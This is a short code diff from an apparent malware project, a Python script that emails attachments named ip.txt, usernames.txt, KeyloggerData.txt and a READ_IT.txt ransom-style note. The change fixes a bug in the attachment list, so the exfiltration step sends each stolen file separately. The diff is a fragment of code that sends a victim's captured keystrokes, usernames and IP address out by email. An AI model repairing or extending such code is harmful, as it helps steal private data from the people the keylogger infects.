@@ -29,7 +29,7 @@ def main():
     outer.preamble = ''
     # List of attachments
     print('[.] Adding Attachments...')
-    attachments = ['Defs/Send_Email/attachments/READ_IT.txt && Defs/Send_Email/attachments/ip.txt','Defs/Send_Email/attachments/usernames.txt','Defs/Send_Email/attachments/KeyloggerData.txt']
+    attachments = ['Defs/Send_Email/attachments/READ_IT.txt','Defs/Send_Email/attachments/ip.txt','Defs/Send_Email/attachments/usernames.txt','Defs/Send_Email/attachments/KeyloggerData.txt']
     print('[.] Attachments Added.')
     # Add the attachments to the message
     for file in attachments:
